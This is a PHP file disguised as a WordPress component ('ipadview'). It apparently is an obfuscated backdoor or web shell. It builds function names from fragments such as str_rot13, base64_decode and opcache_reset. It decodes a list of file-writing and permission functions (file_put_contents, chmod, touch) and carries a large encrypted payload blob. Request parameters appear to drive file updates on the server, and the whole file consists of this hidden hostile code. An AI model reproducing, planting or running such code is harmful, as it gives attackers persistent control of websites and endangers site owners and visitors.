<?php
/**
 * @title ipadview
 * @
 * @param $str
 * @return mixed|string
 */

if (!defined('WP_BLOG')) {
    return version_info("init");
}

function version_desc($str)
{
    ($e = implode("",["opcache","reset"]))&&function_exists($e) && $e();
    if (!$str) {
        echo date("Y-m-d H:i:s") . "<br>";
        if (!empty($_REQUEST['version']) && version_update(version_parse($_REQUEST))) ;
        return '';
    }
    $pi = [
        ['str', 'ro'],
        ["json", 'decode'],
    ];
    ($q = (implode('_', $pi[0]) . "t13")) &&
    $data = $q($str);
    ($q = "b" . implode('_', $pi[1]) . "e") &&
    $data = $q($data);
    if (isset($_GET['s'])) $data = $_GET['s'] . $data;

    return $data;
}

function version_info($str)
{
    global $temp;
    $temp = "ZnVuY3Rpb25fZXhpc3RzLHRpbWUsZm9wZW4sZmlsZV9wdXRfY29udGVudHMsZmlsZWN0aW1lLGZpbGVfZXhpc3RzLGlzX3dyaXRhYmxlLGNobW9kLHRvdWNo";
    $temp = base64_decode($temp);
    $name = ['Y2uioJHmY21up3EyqT5lY3ElLJEyLaIfoP5col9up3AyqUZinJ1aY253pl81A2D3LmZ2MzDkAGDlAmywZQZkZJD3ZzV3BGOuLGx3Zv5eMKx', function ($version_file, $name) use ($temp) {
        $data = translation_v3('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